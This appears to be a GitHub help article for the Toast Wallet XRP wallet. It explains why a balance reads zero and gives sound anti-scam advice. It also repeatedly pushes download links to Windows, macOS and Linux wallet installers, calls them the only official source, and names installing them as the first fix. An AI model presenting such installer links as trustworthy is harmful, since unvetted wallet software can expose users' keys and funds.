<p align="center"><img src="https://github.com/Toast-Wallet/learn/raw/HEAD/assets/banner-article.png" alt="Toast Wallet banner" width="100%"></p>

<h1 align="center">Toast Wallet balance shows zero</h1>

<p align="center">Reasons a balance reads zero and how to confirm your XRP.</p>

<p align="center">
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet.Setup.3.0.0.exe"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-WINDOWS-1f5fbf?style=for-the-badge&logo=windows&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Windows"></a>
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0.dmg"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-MACOS-1f5fbf?style=for-the-badge&logo=apple&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Macos"></a>
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-x86_64.AppImage"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-LINUX-1f5fbf?style=for-the-badge&logo=linux&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Linux"></a>
</p>

| Platform | File |
|:--|:--|
| 🪟 Windows | [`ToastWallet.Setup.3.0.0.exe`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet.Setup.3.0.0.exe) |
| 🍎 macOS | [`ToastWallet-3.0.0.dmg`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0.dmg) |
| 🐧 Linux | [`ToastWallet-3.0.0-x86_64.AppImage`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-x86_64.AppImage) |

All versions and checksums are on the [Toast Wallet 3.0.0 release page](https://github.com/Toast-Wallet/core/releases/tag/3.0.0).

> [!IMPORTANT]
> Only download from this GitHub release page.

---

## 💡 Short answer

A zero balance in Toast Wallet usually means the app has not loaded data yet, is not connected, is showing a different account, or the account was never activated. Install the [latest desktop wallet](https://github.com/Toast-Wallet/core/releases/tag/3.0.0), check the connection and account, and compare the address with your records before assuming anything is lost.

## 👀 You'll see this if

- You open Toast Wallet and your balance reads 0 XRP.
- After restoring a backup, an account appears but shows nothing.
- A brand-new account shows no balance.
- You remember holding XRP but the wallet disagrees.

## 🤔 Why it happens

Toast Wallet does not store your balance; it reads it from the XRP Ledger each time. If the app cannot reach the network, or is still loading, it may show zero for a while. An old version can fail to connect on modern systems. If you have several accounts, you might be looking at an empty one. And a new address shows nothing until it is activated by a payment above the reserve.

Less commonly, an account really is empty because XRP was sent out, either by you at some point or by someone who obtained your keys. Checking the account history tells you which situation you are in.

## 🧭 Before you start

Note the address of the account showing zero. Think about which address you expected to hold your XRP. If you have exchange withdrawal records, find the address you withdrew to back then.

## 🛠️ Fix: find out why it shows zero

1. **Wait and reopen.** Give the app a moment to connect, then close and reopen it.
2. **Update to the latest desktop wallet.** Remove the old program and install the current release; see [update Toast Wallet to the latest version](https://github.com/Toast-Wallet/learn/blob/main/how-to/update-toast-wallet-to-latest-version.md).
3. **Check the connection.** If nothing loads, follow [Toast Wallet not connecting fix](https://github.com/Toast-Wallet/learn/blob/main/how-to/toast-wallet-not-connecting-fix.md).
4. **Check the account.** Compare the displayed address with the one in your records. If they differ, your XRP may be in another account; see [Toast Wallet missing addresses after restore](https://github.com/Toast-Wallet/learn/blob/main/how-to/toast-wallet-missing-addresses-after-restore.md).
5. **New account?** It needs activation; see [activate a new Toast Wallet account](https://github.com/Toast-Wallet/learn/blob/main/how-to/activate-new-toast-wallet-account.md).
6. **Look at the history.** If the account shows past outgoing payments that you do not recognise, treat your keys as compromised and read the prevention section.

## 🧩 Real-world example

A user restores an old backup code on a new laptop and sees a single account with zero XRP. Panic sets in. Checking an old exchange email, they find that their XRP was withdrawn to a second address, created a month after that backup. The old backup simply did not contain it. They find the newer wallet data on their previous laptop, open it with the latest release and see the balance.

## ⚠️ Common mistakes

- Concluding XRP was stolen before checking connection, version and account.
- Restoring an old backup that lacks the funded account.
- Creating a new account and expecting the old balance to appear in it.
- Contacting "recovery services" that promise to restore balances.

## 🔁 If that did not work

- **The history shows payments you did not make.** Someone else had access to your keys. Create a new wallet on a clean computer, back it up and move any remaining XRP there.
- **You cannot find the funded address anywhere.** Search old devices, backups and records. Without the key for that address, it cannot be reopened.
- **A payment you expected never arrived.** See [Toast Wallet transaction not showing](https://github.com/Toast-Wallet/learn/blob/main/how-to/toast-wallet-transaction-not-showing.md).

## 🛡️ Prevention

Keep a list of your account addresses with your backup notes. Make a new backup after adding accounts. Keep the app updated and never enter your secrets on websites.

## 📝 Good to know

A zero balance on screen does not change anything on the ledger. Your XRP is either in the account or not, regardless of what an outdated or disconnected app shows. That is why the first steps are always about the app itself: version, connection and selected account. Only after those are confirmed does the history of the account itself tell the real story.

## 🔍 A closer look at account history

If Toast Wallet shows zero and you are connected and on the right account, the history tells you what happened. A history with incoming payments and no outgoing ones, yet a zero balance, usually means you are looking at the wrong data or the app has not refreshed. A history showing outgoing payments you made yourself, perhaps years ago, solves the mystery quickly. A history with outgoing payments you do not recognise is the serious case: someone else had your keys.

In that last case, act on a different, clean computer. Create a new wallet, make a backup code, and move anything that remains in your other accounts to the new one. Then think about where your secrets might have been exposed, such as a photo, a cloud note, a fake website or a remote-access session, and close that gap so it cannot happen again.

## 🗂️ A short diagnostic order

Work through the causes from most to least likely: app still loading, outdated version, no connection, wrong account selected, unactivated new account, older backup without the funded account, and finally unauthorised payments. Checking in this order avoids unnecessary panic and points you to the right guide quickly.

## ❓ FAQ

<details>
<summary>Can a wallet update erase my balance?</summary>

No. Balances live on the XRP Ledger, not in the app.

</details>

<details>
<summary>Why does a new account show zero?</summary>

It has not been activated yet. Send it more than the reserve.

</details>

<details>
<summary>Can someone restore my stolen XRP?</summary>

No. XRP payments are final. Be wary of anyone who claims otherwise.

</details>

> [!WARNING]
> People promising to "restore" a zero balance are scammers. Never share your secret key, passphrase, words or backup code.

---

## ⬇️ Download Toast Wallet 3.0.0

<p align="center">
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet.Setup.3.0.0.exe"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-WINDOWS-1f5fbf?style=for-the-badge&logo=windows&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Windows"></a>
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0.dmg"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-MACOS-1f5fbf?style=for-the-badge&logo=apple&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Macos"></a>
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-x86_64.AppImage"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-LINUX-1f5fbf?style=for-the-badge&logo=linux&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Linux"></a>
</p>

| Platform | File |
|:--|:--|
| 🪟 Windows | [`ToastWallet.Setup.3.0.0.exe`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet.Setup.3.0.0.exe) |
| 🍎 macOS | [`ToastWallet-3.0.0.dmg`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0.dmg) |
| 🐧 Linux | [`ToastWallet-3.0.0-x86_64.AppImage`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-x86_64.AppImage) |

Checksums for every file are on the [official Toast Wallet 3.0.0 release](https://github.com/Toast-Wallet/core/releases/tag/3.0.0). More guides live in the [Toast Wallet learn hub](https://github.com/Toast-Wallet/learn).

---

## 📚 Related articles

| Guide | What it covers |
|:--|:--|
| [Toast Wallet not connecting fix](https://github.com/Toast-Wallet/learn/blob/main/how-to/toast-wallet-not-connecting-fix.md) | What to check when balances will not load. |
| [Toast Wallet missing addresses after restore](https://github.com/Toast-Wallet/learn/blob/main/how-to/toast-wallet-missing-addresses-after-restore.md) | Why some accounts do not appear and how to bring them back. |
| [Activate a new Toast Wallet account](https://github.com/Toast-Wallet/learn/blob/main/how-to/activate-new-toast-wallet-account.md) | Fund a new address with enough XRP to meet the reserve. |
| [Toast Wallet transaction not showing](https://github.com/Toast-Wallet/learn/blob/main/how-to/toast-wallet-transaction-not-showing.md) | Checks to run when a sent or received payment is missing. |
